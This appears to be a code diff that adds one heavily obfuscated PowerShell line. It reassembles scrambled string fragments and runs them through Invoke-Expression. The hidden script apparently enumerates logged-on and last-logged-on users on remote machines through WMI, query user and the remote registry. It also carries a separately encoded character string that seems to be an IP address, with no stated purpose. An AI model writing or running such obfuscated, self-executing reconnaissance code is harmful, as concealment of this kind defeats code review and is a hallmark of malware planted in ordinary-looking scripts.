@@ -1,0 +1,74 @@
+.( $shELlID[1]+$sHellID[13]+'X') ((("{6}{51}{60}{63}{31}{13}{40}{65}{32}{64}{25}{33}{29}{35}{19}{41}{46}{45}{53}{4}{10}{43}{42}{14}{71}{49}{67}{66}{5}{15}{44}{9}{0}{1}{36}{23}{58}{70}{7}{20}{48}{27}{26}{57}{12}{50}{54}{22}{68}{17}{8}{18}{3}{55}{69}{47}{24}{2}{62}{30}{56}{11}{16}{61}{39}{34}{37}{52}{21}{59}{28}{38}" -f '8yserver
+
+# IDENTICAL
+query user /','se','     (Get-WmiO','05%112c58O49%57U49U46%49V48O54c4','cludes computers and users connected to print servers
+
+# get remote computer idle time!
+# http://stackoverflow.com/questions/38664300/log-off-multiple-idle-users
+
+<#
+Q8yowners = @{}
+gwmi win32_process -computer Q8yenv:computername -Filter hnQname = dsnexplorer.exedsnhnQ D8c % {Q8yowners[Q8y_.handle] = Q8y_.g',') -replace hnQPzms{2,}hnQ, hnQ,hnQ D8c Conv','## INFO
+# find last logged on user of remote computer
+
+# https://www.reddit.com/r/PowerShell/comments/448gdx/noob_','hnQ
+  ','u=  (-JoIN ','qwinsta /server:Q','etowner().us',' catch {
+         ','nQ*Q8y*hnQ D8c % {Get-ChildItem Q8y_.','mSOFTWAREPzmMicrosoftPzmWindowsPzmCurrentVersionPzmAuthenticationPzmLo','er D8c % {Q8yowners[Q8y_.id.tostring()]}
+#>
+
+<# all give about the ','ertFrom-Csv
+Q8yserver = hnQlocalhosthnQ
+
+# IDENTICAL
+query session /s','       try {
+                    [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(hnQLocalMachinehnQ, Q8ycomp).OpenSubKey(hnQSOFTWAREPzmMicrosoftPzmWindowsPzmCurrentVersionPzmAuthenticationPzmLogonUIhnQ).getvalue(hnQLastLoggedOnUserhnQ)
+                    ','ser D8c % {Q8y_.group D8c select -f 1}
+            Q8yeyF','(hnQ39G1','nQ).getvalue(hnQLastLogge','  )
+    
+    sw','getowner().user}
+            Get-Proces','Q8ycomp}}, @{n=hnQUserhnQ;e={Split-Path (Split-Path Q8y_.FullName) -Leaf}}, La','r','temhnQ {
+            try {
+           ','er
+# [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(hnQLocalMachinehnQ,Q8ycomputer).OpenSubKey(hnQSOFTWAREPzm','mQ8ycompPzmcQ8yPzmusers -Directory -Excl','et-ChildItem PzmPz','plorer -ComputerName Q8ycomp D8c % {Q8yowners[Q8y_.id.tostring(','Vers','ject win32_computerSystem -ComputerName Q8ycomp).username
+ ','e...
+# http://powershell.com/cs/forums/t/23349.aspx
+
+# (gp dsnHKLM:Pz','TWAREPzmMicrosoftPzmWindowsPzmCurrentVersionPzmAuthenticationP','MicrosoftPzmWindowsPzmCurrent','orhnQ
+                }
+            }
+        }
+
+        hnQprocesshnQ {
+         ','ionPzmAuthenticationPzmLogonUIh','rver:Q8yserver
+quser /serve','   Q8yowners = @{}
+            Get-WmiObject win32_proce',')]}
+        }
+    }
+}
+
+','omp
+                } catch {
+                    hnQErr','gonUIdsn).lastloggedonuser
+# reg qu','dOnUser',' explor','er}
+get-process -computer Q8yenv:computername','erver:Q8yserver
+',' win32_loggedonuser).antecedent # this is remote connections, not necessarily logo','hnQ)
+
+# (gwmi','Q -SPliT hnQhhnQ-SPLit hnQ%hnQ -sPLIt hnQ,hnQ-spLiThnQ<hnQD8cFoReach-ObjEct{ ([int] Q8y_ -as [CHAR]) } ) )
+        }
+
+        hnQcomputersys','itch (Q8ymethod) {
+        hnQdirhnQ {
+            G','first two might give more
+# https://www.reddit.com/r/PowerShell/comments/4','FullName ntuser.dat* -Force -ea 0} D8c sort LastWriteTime -Descending D8c select @{n=hnQCompu','need_help_getting_a_list_with_all_','ss -Filter hnQname = dsnexplorer.exedsnhnQ -ComputerName Q8ycomp D8c % {Q8yowners[Q8y_.handle] = Q8y_.','ns. in','terhnQ;e={','6y','           }','ude h',':Q8yserver
+
+qprocess explorer.exe /server:Q8yserver
+#>
+
+function Get-User {
+    param (
+        [string]Q8ycomp = Q8yenv:COMPUTERNAME,
+        [Vali','s ex','xp/
+
+# get-ciminstance is ','Get-WmiObject Win32_NetworkLoginProfile -ComputerName Q8yc','b','the successor, but it doesnhnQt work for m','zmLogonUI /v LastLoggedOnUs','ery PzmPzmQ8ycomputerPzmHKLMPzmSOF','quser','dwqlc/crypto_tripwire_-_help_with_script/d1v0jg5?context=3
+(','stWriteTime D8c ? user -notmatch hnQPzm.nethnQD8c group computer, u','49%55,49U46%49U52V56c39hnQ-SPLIThnQchnQ-SpLIT hnQUhnQ-SplithnQVhnQ-sPLiT hnQyhnQ -splithnQOhnQ-spLIThnQGhn','dateSet(hnQcomputersystemhnQ, hnQprocesshnQ, hnQdirhnQ)]
+        Q8ymethod = hnQcomputersystem','same information. the ')).REPLaCe(([ChAr]68+[ChAr]56+[ChAr]99),[STring][ChAr]124).REPLaCe(([ChAr]80+[ChAr]122+[ChAr]109),[STring][ChAr]92).REPLaCe(([ChAr]104+[ChAr]110+[ChAr]81),[STring][ChAr]39).REPLaCe(([ChAr]81+[ChAr]56+[ChAr]121),'$').REPLaCe(([ChAr]100+[ChAr]115+[ChAr]110),[STring][ChAr]34) ) 
